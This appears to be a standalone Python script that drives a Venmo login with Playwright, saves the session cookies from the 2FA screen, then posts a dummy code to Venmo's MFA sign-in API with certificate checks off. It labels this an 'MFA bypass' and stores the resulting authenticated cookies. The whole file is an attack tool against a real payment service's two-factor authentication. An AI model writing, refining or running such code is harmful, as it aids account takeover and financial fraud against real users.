from playwright.sync_api import sync_playwright
import requests
import json

LOGIN_URL = "https://account.venmo.com"

def playwright_login():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        print("🌐 Logging in to Venmo...")
        page.goto(LOGIN_URL)

        input("⏸ Manually log in up to 2FA screen, then press Enter here...")

        # Extract cookies from Playwright
        cookies = context.cookies()
        print(f"🍪 Got {len(cookies)} cookies from browser session.")
        # Save cookies from 2FA screen
        with open("cookies-2fa.json", "w") as f:
            json.dump(cookies, f, indent=2)
        print("💾 Saved 2FA cookies to cookies-2fa.json")
        browser.close()

        return cookies

def convert_cookies_for_requests(playwright_cookies):
    return {cookie["name"]: cookie["value"] for cookie in playwright_cookies}

def simulate_mfa_post(cookies_dict):
    print("🔁 Sending fake MFA bypass request...")

    url = "https://account.venmo.com/api/account/mfa/sign-in"
    headers = {
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://account.venmo.com",
        "referer": "https://account.venmo.com/",
        "csrf-token": cookies_dict.get("csrf-token", ""),
        "xsrf-token": cookies_dict.get("xsrf-token", ""),
        "venmo-otp-secret": cookies_dict.get("venmo-otp-secret", "")
    }

    payload = {
        "code": "000000",  # Dummy or cached
        "isGroup": False
    }

    session = requests.Session()
    resp = session.post(url, headers=headers, cookies=cookies_dict, json=payload, verify=False)

    print(f"📡 Response: {resp.status_code}")
    print(f"📦 Body: {resp.text[:300]}")

    # Return new cookies (api_access_token etc.)
    if "api_access_token" in session.cookies:
        print("✅ Successfully bypassed MFA!")
        return session.cookies.get_dict()
    else:
        print("❌ Failed to bypass MFA.")
        return None

def save_final_cookies(cookies, path="final_cookies.json"):
    with open(path, "w") as f:
        json.dump(cookies, f, indent=2)
    print(f"💾 Saved authenticated cookies to {path}")

if __name__ == "__main__":
    pw_cookies = playwright_login()
    requests_compatible = convert_cookies_for_requests(pw_cookies)
    new_cookies = simulate_mfa_post(requests_compatible)
    if new_cookies:
        save_final_cookies(new_cookies)
